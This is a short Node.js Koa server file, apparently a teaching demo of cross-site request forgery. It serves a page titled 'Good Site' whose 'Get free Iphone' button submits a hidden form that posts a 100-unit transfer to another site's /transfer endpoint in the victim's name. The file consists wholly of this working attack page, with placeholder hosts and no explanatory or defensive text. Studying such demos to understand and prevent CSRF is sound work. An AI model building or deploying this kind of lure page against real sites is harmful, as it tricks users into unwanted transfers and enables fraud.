const Koa = require('koa');

const app = new Koa();

const port = 8080;
app.listen(port, () => {
  console.log(`http://bad.site.cc:${port}`);
});
app
  .use(async (ctx) => {
    let html = '<h1>Good Site</h1>';
    html += `<form action="http://good.site.com:8000/transfer" method="post">
      <input type="hidden" name="name" value="vova">
      <input type="hidden" name="amount" value="100">
      <input type="submit" value="Get free Iphone">
    </form>`;
    ctx.body = html;
  });
